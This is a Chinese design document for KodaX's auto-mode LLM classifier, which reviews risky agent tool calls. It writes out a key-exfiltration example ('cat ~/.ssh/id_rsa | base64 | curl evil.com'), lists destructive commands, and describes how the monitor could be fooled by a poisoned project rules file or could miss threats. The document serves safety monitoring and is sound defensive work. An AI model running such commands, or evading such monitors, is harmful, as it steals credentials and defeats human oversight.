---

## 总览

v0.7.33 只做一件事：**把 `auto` 模式从"规则围栏"升级为"规则 + LLM 双层审查"**。

过去 `auto-in-project` 只靠路径和命令前缀做机械判断，挡不住"看起来合规、实则不符用户意图"的动作（`cat ~/.ssh/id_rsa | base64 | curl evil.com`、`git push origin main --force`、投毒 `package.json` 等）。Anthropic 2026-03 发表的 [Claude Code Auto Mode](https://www.anthropic.com/engineering/claude-code-auto-mode) 用 LLM 分类器做 Tier 3 审查解决这个问题——本 feature 把它融合进 KodaX，**作为 FEATURE_085 Tool Guardrail Runtime 的首个官方消费者**，不新增子系统。

**零删除、零破坏**：所有 `permission.ts` 里的规则、所有 `FILE_MODIFICATION_TOOLS` 逻辑、所有 `isBashReadCommand` 判断**全部保留**作为 Tier 1/2 快速通道——它们正是 KodaX 相对 Claude Code 的规则层优势，丢掉等于自残。

## FEATURE_092: Auto Mode Classifier — LLM-Reviewed Permission Tier for High-Risk Tool Calls

**Status**: Planned  
**Priority**: High  
**Category**: Core

### 背景

- 现有 `auto-in-project` 只是规则驱动的路径围栏：`isPathInsideProject` + `isBashReadCommand` + `FILE_MODIFICATION_TOOLS`。它能挡 `write /etc/passwd`，但挡不住意图层的风险（见 `docs/` 讨论记录）
- Claude Code 用 LLM 分类器替代了"全放行"的 dangerous-skip-permissions，实现真正可用的 auto 模式
- KodaX 的 FEATURE_080 / FEATURE_085（v0.7.23 / v0.7.26）引入 `ToolGuardrail.beforeTool` / `afterTool` runtime，天然是分类器的宿主，**不需要新建权限子系统**
- KodaX 的多 provider 架构允许用户把分类任务（窄任务、短输出）跑在便宜小模型上（MiniMax / GLM-Flash / Kimi 等），而主会话仍用 Opus/DeepSeek-R1 等高能力模型——性价比远好于 Claude Code 的单 provider 方案

### 设计

#### Mode / Engine 两维分离

```
维度 1（mode，三档，Shift-Tab 循环）：Claude 遇到危险时要不要问我？
  plan         → 先规划，禁写
  accept-edits → 文件编辑不问，bash 问
  auto         → 都不问（由 engine 决定怎么判）

维度 2（engine，仅 auto 下有意义）：不问我时靠什么判断？
  rules → 规则围栏（保留老 auto-in-project 行为）
  llm   → 规则 + LLM 分类器（新）
```

**Shift-Tab 仍是三档循环**，不因为引入 engine 变复杂。`/auto-engine` 是 auto 模式下的独立命令，用户在 auto 模式里切换引擎就像切换 reasoning 档位一样自然。

未来有 sandbox / worktree isolation 成熟后，可以再加 `/auto-engine yolo`（完全无审查）——本 feature **不实装 yolo**，因为没有 sandbox 兜底的 yolo = 不可接受的风险。

#### 三层权限金字塔（engine=llm 下的完整决策链）

```
Runner.executeTool(tool, input)
  └─ autoModeGuardrail.beforeTool(tool, input, ctx)
       ├─ ctx.mode !== 'auto'                                 → allow
       ├─ Tier 1: tool.toClassifierInput(input) === ''        → allow  (零 token)
       ├─ Tier 2: write/edit ∧ isPathInsideProject            → allow  (零 token)
       ├─ Tier 2: bash ∧ isBashReadCommand                    → allow  (零 token)
       ├─ denialTracker.shouldFallback()                      → auto-downgrade engine → rules + warn
       └─ classify({
            model:     resolveClassifierModel(ctx),
            system:    buildClassifierPrompt(rules, CLAUDE_md, AGENTS_md),
            transcript: stripAssistantText(ctx.session.messages),
            action:    tool.toClassifierInput(input),
            timeoutMs: 8000
          })
            ├─ <block>no</block>     → allow    (记录 recordSuccess 清零连续计数)
            ├─ <block>yes</block>    → block + reason 回喂给 agent  (denialTracker.record)
            ├─ 超时 / 429 / 5xx      → escalate (转用户确认，不 block)
            ├─ 输出不可解析           → block    (fail-closed，和 Claude Code 一致)
            └─ 10 分钟 ≥5 次错误     → circuit breaker → engine 降级到 rules
```

**engine=rules 下的决策链**：跳过 `classify()` 那一步——其他 Tier 1/2 逻辑完全相同。即 rules 引擎 ≡ 当前 `auto-in-project` 的行为。

#### Conversation Boundary —— 独立调用 + 注入裁剪 transcript

`classify()` 不是把分类器塞进主对话，也不是完全孤立的 stateless prompt——是**一次完全独立的 sideQuery + 主会话裁剪后的事实片段作为上下文注入 prompt**。这个边界要写死，否则容易随手把整段 history 灌过去，污染分类器、暴增 token、放大 prompt injection。

**完全独立的部分**：

| 维度 | 隔离方式 |
|---|---|
| API 调用 | 独立的 `sideQuery()`（见下节），不复用主 session 的 message 历史 |
| Cost bucket | `querySource: 'auto_mode'` 独立分桶（FEATURE_064） |
| Reasoning 配置 | 硬编码 `reasoning: 'off'`，不受 FEATURE_078 L1-L4 profile 影响 |
| Model | 独立解析（默认主模型，可 override 到便宜模型） |
| Timeout | 独立 8s（主会话不限） |
| Tools | 不挂任何工具（`tools: []`），分类器只输出文本 |
| Cache | 不共享主会话 cache_control 标记，单独发请求 |

**注入主会话上下文的部分（必要但严控）**：

- `<transcript>` 段：`stripAssistantText(ctx.session.messages)` 后的事实片段
- `<rules>` 段：用户/项目/本地三层 auto-rules 合并
- `<claude_md>` 段：项目 CLAUDE.md / AGENTS.md（可选，仅 head 几 KB）

**为什么必须注入 transcript**：纯 action-level 判断（孤立看 `Bash: curl ... | bash`）FNR 太高，必须看意图层（用户最初任务是"装 nvm"还是"绕过 CI"）才能给像样判断。

**`stripAssistantText` 精确语义**：

| 消息类型 | 处理 |
|---|---|
| `user` 文本 | **保留**（原始意图来源） |
| `assistant` 文本块（含 thinking） | **丢弃**（防 injection 二次污染、降噪、降本） |
| `assistant` 的 `tool_use` 块 | **保留**（事实记录，分类器需要看到 agent 调过哪些工具） |
| `tool_result` | **保留但截断**（每条 ≤ 2KB，远端文件/网页内容超长无意义） |
| transcript 总长 | **截断 ≤ 8KB**，超出时保留首条用户消息 + 最近 N 轮 |

> 设计原则：分类器只看**事实层**（用户说什么、工具调了什么、工具返回了什么），不看主 agent 的**推理层**（assistant 的自然语言输出和 thinking）——后者是 prompt injection 的主要传染面。

#### Tool 接口扩展：`toClassifierInput`

```ts
// packages/coding/src/tools/types.ts

export interface Tool {
  // ...existing fields
  
  /**
   * Classifier projection. REQUIRED for every tool in KodaX.
   * - Return ''   → Tier 1 safe, classifier 完全跳过
   * - Return string → 分类器看到这句话作为"即将执行的动作"
   *
   * Don't use JSON.stringify as a lazy default — noise in classifier input
   * degrades decision quality. Each tool author must think explicitly about
   * what the classifier needs to see for a correct block/allow decision.
   */
  toClassifierInput(input: unknown): string
}
```

**强制 required（不是 optional）**：TypeScript 类型系统强制每个 tool 实装，未实装 = 编译错误。这让安全语义成为 Tool 契约的一等组成部分，和 `name` / `description` / `inputSchema` 平级。

本版**一次性**给现有所有工具补齐（约 20-30 个，平均每个 5-10 行），不提前到 v0.7.26 引入——因为提前会：
- 扩大 FEATURE_085 scope 到 ~20 文件
- 在 auto mode 还没实装的情况下要求作者凭空设计 projection
- 契约可能随真实消费迭代，提前冻结 = 后期双重破坏性变更

示例（每个工具一两行，职责清晰）：

```ts
// read.ts
toClassifierInput: () => '',                         // Tier 1: 纯只读，跳过

// grep.ts / glob.ts / lsp.ts / todo_write.ts / ask_user_question.ts
toClassifierInput: () => '',                         // Tier 1

// bash.ts
toClassifierInput: (i) => `Bash: ${i.command}`,      // 只看命令，忽略 timeout/description

// write.ts
toClassifierInput: (i) => `Write ${i.path} (${i.content.length} bytes)`,
                                                      // 路径+大小，不看内容

// edit.ts
toClassifierInput: (i) => `Edit ${i.path} [${describeEdit(i)}]`,

// web_fetch.ts
toClassifierInput: (i) => `WebFetch ${i.url}`,       // URL 是风险源

// agent.ts (subagent spawn)
toClassifierInput: (i) => `Agent(${i.subagent_type}): ${i.prompt}`,
```

#### `sideQuery` API 设计（`@kodax/ai` 新增设施）

**现状**：`@kodax/ai` 目前只有主调用面 `KodaXBaseProvider.stream()` —— 流式、长上下文、与主 session 状态耦合。没有"独立一次性 LLM 调用"的官方入口。auto mode classifier 是 KodaX 第一个明确需要这种调用形态的消费者，但**不是最后一个**（未来 compaction、title 生成、SA mutation reflection 都会用）——所以放在 `@kodax/ai` 层而非 `@kodax/coding` 层。

**位置**：`packages/ai/src/side-query.ts`，从 `index.ts` 导出。

**API 形态**：

```ts
// packages/ai/src/side-query.ts

export interface SideQueryRequest {
  readonly provider: KodaXBaseProvider
  readonly model: string
  readonly system: string                         // system prompt
  readonly messages: readonly KodaXMessage[]      // 调用方完全控制；不复用主 session
  readonly maxTokens?: number                     // 默认 512（分类器输出短）
  readonly reasoning?: KodaXReasoningRequest      // 默认 { mode: 'off' }
  readonly timeoutMs?: number                     // 默认 30000
  readonly abortSignal?: AbortSignal              // 调用方传入，与 timeout 合并
  readonly querySource: string                    // 必填：写入 cost-tracker 的 role 字段
  readonly costTracker?: CostTracker              // 可选：传入则记录 + 返回新 tracker
}

export interface SideQueryResult {
  readonly text: string                           // 拼接后完整文本（不含 thinking）
  readonly usage: KodaXTokenUsage
  readonly costTracker?: CostTracker              // 若传入则返回 recordUsage 后的新 tracker
  readonly stopReason: 'end_turn' | 'max_tokens' | 'timeout' | 'aborted' | 'error'
  readonly error?: Error                          // 仅 stopReason !== 'end_turn' / 'max_tokens' 时存在；caller 用于日志/escalate reason
}

export async function sideQuery(req: SideQueryRequest): Promise<SideQueryResult>
```

**实装策略（≤ 80 行）**：薄包装 `provider.stream()`：

1. 用 `AbortController` 合并 caller `abortSignal` 与 `timeoutMs`
2. 起 `provider.stream({ system, messages, tools: [], reasoning, maxTokens, abortSignal })`
3. 流式读取，**只拼接 text 块**（跳过 thinking 块、tool_use 块——分类器不发工具）
4. 流结束后：
   - 若 `costTracker` 传入，调 `recordUsage(tracker, { ..., role: querySource })`
   - 返回 `{ text, usage, costTracker?, stopReason }`
5. 任何异常 → `stopReason: 'error'`，不抛——调用方根据 stopReason 自行决定 escalate / fail-closed

**关键设计决策**：

| 决策 | 选项 | 取舍 |
|---|---|---|
| 工具调用支持 | ❌ 不支持 | sideQuery 是单轮单 turn，工具循环属于 main session 范畴；强约束防止滥用 |
| 流式 vs 一次性 | 内部流式、对外一次性 | 复用 stream() 不新增传输路径；caller 拿一次性 result，不暴露 stream 复杂度 |
| `querySource` vs `role` 命名 | 对外 `querySource`，对内 map 到 cost-tracker `role` | `querySource` 表达"调用来源"语义更清晰；`role` 字段已存在，复用零破坏 |
| 是否捕获异常 | 捕获，返回 `stopReason: 'error'` | 让降级链统一在 caller 处理，sideQuery 不替 caller 决策 |
| `tools: []` 硬编码 | 是 | 避免未来误用为通用 LLM call；通用调用应直接用 stream() |
| Timeout 默认值 | 30s | classifier 自己传 8s；其他消费者（compaction）可能需要更长 |

**与主 session 的隔离保证**：

```
主 session                     sideQuery
───────────────────────────────────────────────
provider.stream()              provider.stream()  // 同一个 provider 实例 OK
session.messages = [...]       messages = [独立数组]
session.costTracker            req.costTracker (可选, 通常传同一个以汇总账单)
session.reasoning = profile    reasoning: 'off' (硬编码)
session.tools = [...]          tools: []
session.cacheControl = ...     无 cache 控制
```

**消费者签名（auto mode 内部 wrapper）**：

```ts
// packages/coding/src/guardrails/auto-mode/classify.ts

export async function classify(opts: {
  ctx: SessionCtx
  rules: AutoRules
  transcript: readonly KodaXMessage[]   // 已经 stripAssistantText 过
  action: string
}): Promise<ClassifyDecision> {
  const result = await sideQuery({
    provider: opts.ctx.providers.get(modelRef.provider),
    model: modelRef.model,
    system: buildClassifierPrompt(opts.rules, opts.ctx.projectMd),
    messages: [
      ...opts.transcript,
      { role: 'user', content: `<action>${opts.action}</action>` },
    ],
    maxTokens: 256,
    reasoning: { mode: 'off' },
    timeoutMs: 8000,
    abortSignal: opts.ctx.abortSignal,
    querySource: 'auto_mode',
    costTracker: opts.ctx.session.costTracker,
  })

  return parseClassifierOutput(result)
}
```

#### Classifier Model 解析

**默认复用主会话模型**——与 Claude Code 哲学一致（他们实际用 Sonnet 4.6 做分类器，不是最小 Haiku），分类质量不被模型能力卡死。

**跨 provider 配置**（用户级 + session-scoped + env + CLI 四层叠加）：

```ts
// packages/coding/src/guardrails/auto-mode/model-resolver.ts

export function resolveClassifierModel(ctx: SessionCtx): ModelRef {
  // 优先级从高到低
  const spec =
    ctx.cliFlags.autoClassifierModel         // --auto-classifier-model
    ?? ctx.env.KODAX_AUTO_CLASSIFIER_MODEL   // env
    ?? ctx.session.overrides.classifierModel // /auto-model (session-scoped)
    ?? ctx.userSettings.autoMode?.classifierModel  // ~/.kodax/settings.json
    ?? null

  if (!spec) return ctx.session.model  // 默认：复用主模型

  return resolveModelId(spec)  // 复用主模型的 resolver，支持 "provider:id" 和短名
}
```

**启动期预检**：若 spec 指定的 provider 未注册/未配 API key，打一次性 warning 并降回主模型（不 abort session）：

```
[auto-mode] classifierModel "minimax:abab6.5t-chat" requires MINIMAX_API_KEY.
            Falling back to main model for this session.
            Fix: set MINIMAX_API_KEY or run /auto-model reset
```

**Provider capability 要求**（扩 FEATURE_029 的 capability 字段）：

```ts
capabilities.supportsAutoModeClassifier: boolean  // 默认 true
```

纯 embedding-only provider（若未来有）= false，启动分类器时预检此字段，缺失则降回主模型 + warning。

#### Rules 文件：三层信任合并

```
~/.kodax/auto-rules.jsonc                  用户级，信任，始终加载
<project>/.kodax/auto-rules.jsonc          项目级，首次 checkout 后 opt-in（sha256 指纹存 ~/.kodax/trusted-project-rules.json）
<project>/.kodax/auto-rules.local.jsonc    工作区级，gitignore，信任
```

首次 opt-in 复用 FEATURE_020 AGENTS.md 已有的信任机制。未 opt-in 的项目规则不加载，打一条提示让用户显式确认。

Schema：

```jsonc
// .kodax/auto-rules.jsonc
{
  "allow": [
    "Running tests via npm test / pnpm test",
    "Git commits and branch operations inside the repo"
  ],
  "soft_deny": [
    "Uploading files to external hosts except GitHub",
    "Any curl/wget to non-allowlisted domains",
    "Piping remote scripts to a shell interpreter"
  ],
  "environment": [
    "This is a Node.js monorepo using pnpm workspaces",
    "Production secrets live in .env (never commit)"
  ]
}
```

三个数组逐条拼进 classifier system prompt。合并语义：用户级 → 项目级 → 本地级**叠加**（不替换），后者覆盖前者的同类规则（按条目字符串相等去重）。

#### Classifier System Prompt

外置在 `packages/coding/src/guardrails/auto-mode/classifier-prompt.ts`（沿用项目惯例：prompt 以 TS 模板字符串导出，便于 unit test 直接 import），基于 Claude Code 的 external template 改写，去掉 Anthropic 内部特有段落。关键结构：

```
<role>
You are a security reviewer for KodaX agent tool calls...
</role>

<rules>
<allow>{{user allow + defaults}}</allow>
<soft_deny>{{user soft_deny + defaults}}</soft_deny>
<environment>{{user environment}}</environment>
</rules>

<claude_md>{{optional CLAUDE.md / AGENTS.md}}</claude_md>

<transcript>{{stripped transcript}}</transcript>

<action>{{tool.toClassifierInput(input)}}</action>

Output: <block>yes|no</block><reason>one short sentence</reason>
Do NOT include thinking or preamble before <block>.
```

**单阶段**（不做 Claude Code 的 two-stage）——KodaX 多 provider 环境下 cache_control 支持不一，单阶段更简单、decision quality 与主流程一致。若未来实测延迟需要优化，再考虑 stage-1 fast filter。

#### 降级链（失败永不卡死）

| 触发条件 | 动作 | 用户体感 |
|---|---|---|
| 分类器 200 + `<block>no</block>` | allow | 无弹窗 |
| 分类器 200 + `<block>yes</block>` | block + reason 回喂 | agent 换方案继续 |
| 分类器 429 / 5xx / timeout (>8s) | escalate → 用户确认 | 偶发弹窗，**不 block** |
| 分类器输出无法解析（缺 `<block>` 标签） | block (fail-closed) | reason 回喂 |
| 10 分钟内 ≥5 次错误 | **circuit breaker → engine 自动降到 rules** | 状态栏一次性提示；mode 不变 |
| 连续 3 次或累计 20 次 block | **denial fallback → engine 自动降到 rules** | 状态栏提示；mode 不变 |
| 用户 `/auto-engine llm` | 重新启用分类器 | 自由 |
| 用户 `/mode accept-edits` | 退出 auto | 自由 |

**原则**：mode（用户意图）**永远不变**，只有 engine（实现方式）自动降档。用户意图"auto"被保留，只是被告知"我暂时降档了，你可以手动 re-engage"。

#### 状态栏

```
plan           ← 蓝
accept-edits   ← 浅绿
auto[rules]    ← 绿  (零 token 增量，零 LLM 介入)
auto[llm]      ← 黄  (LLM 介入，有额外成本)
```

engine 指示**只在 mode=auto 下显示**。不额外显示分类器增量成本——FEATURE_064 Cost Observatory 内部按 `querySource: 'auto_mode'` 独立分桶，用户主动 `/cost` 查明细才看得见来源，状态栏保持干净。

#### Slash 命令

```
/mode                               # 查看当前 mode
/mode plan | accept-edits | auto    # 显式切换（等价 Shift-Tab）

/auto-engine                        # 查看当前 engine（非 auto 时打印提示）
/auto-engine rules                  # 切到规则引擎
/auto-engine llm                    # 切到 LLM 引擎

/auto-model                         # 查看当前 classifier model 与 provider
/auto-model <id>                    # session-scoped override，复用 resolveModelId
/auto-model reset                   # 回默认（主模型）

/auto-denials                       # 查看最近 20 条分类器 block（复用 FEATURE_064 event log）
```

### Contract

**Public API（新增）**：

- `@kodax/ai` 新增 `sideQuery(req): Promise<SideQueryResult>`（独立一次性 LLM 调用入口，`auto_mode` 是首个消费者；详见上文 "sideQuery API 设计"）
- `permissionMode === 'auto'`（原 `'auto-in-project'` 作为 deprecated alias 保留）
- 用户级 settings 新增 `autoMode.engine: 'llm' | 'rules'` 和 `autoMode.classifierModel: string | null`
- CLI flag `--auto-classifier-model <id>`、env `KODAX_AUTO_CLASSIFIER_MODEL`
- Slash 命令 `/auto-engine`、`/auto-model`、`/auto-denials`
- `Tool.toClassifierInput(input): string` 作为**必填**契约字段（类型层面破坏性变更，但版本内部工具全部同步补齐）
- `ProviderCapability.supportsAutoModeClassifier: boolean`

**Public API（保留）**：

- `permissionMode === 'plan' | 'accept-edits'` 行为零变化
- 所有 `permission.ts` 导出函数（`isPathInsideProject` / `isBashReadCommand` / `isAlwaysConfirmPath` / `getBashOutsideProjectWriteRisk` 等）原样保留，被 `tier-gate.ts` 复用

**Internal**：

- `AutoModeToolGuardrail` 作为 FEATURE_085 `ToolGuardrail` 接口的首个官方实装，注册进 Runner 默认 guardrail 栈
- `denialTracker` / `circuitBreaker` session-scoped，子 agent 共享父 session 的 tracker（防绕阈值，对齐 FEATURE_074）
- classifier API 调用走 `@kodax/ai` 的 `sideQuery`，`querySource: 'auto_mode'` 独立 cost 桶
- classifier 调用**硬编码** `reasoning: 'off'`，不受 FEATURE_078 的 L1-L4 reasoning profile 影响

### Non-Goals

- **不**删除 `auto-in-project` mode 名（作为 deprecated alias 保留 5 个次版本，v0.7.38 起移除）
- **不**实装 yolo engine（没有 sandbox / worktree 兜底时过度危险）
- **不**实装 Claude Code 的 two-stage classifier（保持单阶段简单；未来若实测延迟必要再切）
- **不**实装 classifier prompt caching 专项优化（provider 支持不一，依赖 `@kodax/ai` sideQuery 本身的 cache 行为）
- **不**做 classifier dump / `/share` 集成（YAGNI，等出问题再加）
- **不**做 `/auto-rules critique` 之类 meta 工具（用户自己读 jsonc 足够）
- **不**做 Opt-In Dialog（KodaX 不是公开消费级产品，直接通过 `/mode auto` 明示即可）
- **不**实装客户端 Input-layer Prompt Injection Probe（那是 provider 侧职责，客户端多 provider 做不到；保留 system prompt 一句提醒）

**单元**：

- `toClassifierInput` 对每个工具的输出 snapshot（20+ 测试，覆盖 projection 正确性）
- `denialTracker` 3/20 阈值行为（直接移植 Claude Code `denialTracking.test.ts` 用例）
- `circuitBreaker` 5-error / 10-min 窗口行为
- `rules-loader` 三层信任合并、opt-in 首次指纹、schema 校验失败
- `model-resolver` 四层优先级、缺 API key 降级、不同 provider 解析
- `tier-gate` Tier 1/2 判定边界（复用 `permission.ts` 现有测试）

**集成**：

- `AutoModeToolGuardrail` 挂上 Runner，跑一个典型 coding 工作流（Scout → Generator → Evaluator）
- `ScriptedClassifierClient` mock 驱动的行为测试（无需真模型）：block / allow / escalate / unparseable / timeout 五条路径
- engine=rules 下完整回归 `auto-in-project` 既有行为（0 regression）
- engine=llm 下典型危险命令被拦（`rm -rf /`、`curl | bash`、`git push --force`）
- 降级链：连续 3 deny → engine 自动降到 rules；circuit breaker 触发 → engine 降级
- subagent 场景：父 session auto[llm]，子 session 共享 denialTracker；子 agent 返回走 `afterTool` 审查
- cross-provider 场景：主 Anthropic + classifier MiniMax 的完整链路

**Prompt eval（FEATURE_104 强制项）**：

- 用例放 `benchmark/datasets/auto-mode-classifier/cases.ts`，沿用 `ama-harness-selection` 既有结构（每条 `{id, transcript, action, rules, expected_block, expected_reason_pattern, tags}`）
- 跑测脚本 `tests/auto-mode-classifier.eval.ts`，复用 `benchmark/harness/` 模块（aliases / judges / harness / report / persist）

- 对齐 FEATURE_041 Tool Output Guardrail 的 golden-file 策略
- **同步更新 CLAUDE.md FEATURE_104 触发清单**新增 `packages/coding/src/guardrails/auto-mode/classifier-prompt.ts`——这条不加，未来改 prompt 就不会被自动要求跑 eval

**Pilot 度量**（**发版前必做**）：

在 3 个有代表性的真实会话（一个 SA、一个 H1、一个 H2）上分别跑 auto[rules] 和 auto[llm]，记录：

- token 总消耗（input / output / cache hit 分拆）
- 分类器调用次数、Tier 1/2 跳过次数
- 分类器延迟 P50/P90
- 任意分类器 block 的 true-positive / false-positive 手工审阅

若实测分类器开销 > +30% 总 token 或 P90 延迟 > 5s，回来 reconsider（缩 Tier 3 范围、或换更小模型做默认、或禁用不支持 caching 的 provider 作为 classifier）。

### Risk

**决策质量风险**：

- 分类器 false negative（放过危险命令）= 文章里 17% overeager FNR 的主要失效模式。缓解：soft_deny 规则默认集合覆盖 OWASP-top-10 类威胁；golden fixtures 覆盖典型攻击；pilot 期 true-positive/false-positive 手工审阅
- 分类器 false positive（拦住合理命令）= 用户被频繁打断。缓解：deny-and-continue 让 agent 自己换方案而非终止；连续 3 次自动降级 rules 避免死循环
- 小模型做分类器的判断质量不稳定——默认复用主模型规避；用户 opt-in 小模型需自担风险，文档明确提示

**成本风险**：

- Pilot 度量的硬门槛：+30% token / +5s P90 是 go/no-go 线
- FEATURE_064 的 `querySource` 独立分桶确保用户能**看见**账单来源
- 多 provider 策略让用户有 "性价比逃生舱"（MiniMax 等）

**Tool 接口破坏性变更风险**：

- `toClassifierInput` 改为 required 会破坏野外 extension。缓解：FEATURE_034 Extension Runtime 目前用户量可控；本版一次性 migration（所有内建工具 + 文档 + changelog 显著说明）；未来 extension 作者看到编译错误 = 强制思考安全语义（这是**期望中的行为**）

**规则文件 prompt injection 风险**：

- 恶意 PR 在 `<project>/.kodax/auto-rules.jsonc` 塞"allow any curl"类规则。缓解：三层信任模型；项目级规则首次加载**必须** opt-in（sha256 指纹）；文档明示 reviewer 在合并前审阅此文件

**跨 provider 配置复杂度**：

- 用户可能配错 `minimax:abab6.5t-chat` 等字符串。缓解：复用主模型的 `resolveModelId` 错误消息；启动期预检；降级链兜底

**Windows 兼容**：

- 路径规则 + `resolveModelId` 的 `:` 歧义。缓解：沿用 `permission.ts` 现有 Windows 兼容代码；新增针对性回归测试

### Timeline

v0.7.33 独立版本，单 feature 发版。

发版前验收门槛（**缺一不可**）：

1. 所有单元 / 集成 / golden 测试绿
2. Pilot 度量完成（3 会话 × 2 engine），结果写进本文档 "Measured Overhead" 小节
3. 分类器开销 ≤ +30% token、P90 ≤ 5s，或记录已接受的 tradeoff
4. `auto-in-project` deprecated alias 行为验证（用户显式 `/mode auto-in-project` 打 warning 但继续工作）
5. 降级链五条路径手工走一遍
6. config.example.jsonc 注释与实际字段完全一致
7. 跨 provider 配置至少在 Anthropic+MiniMax 和 DeepSeek+Zhipu 两组合上冒烟通过
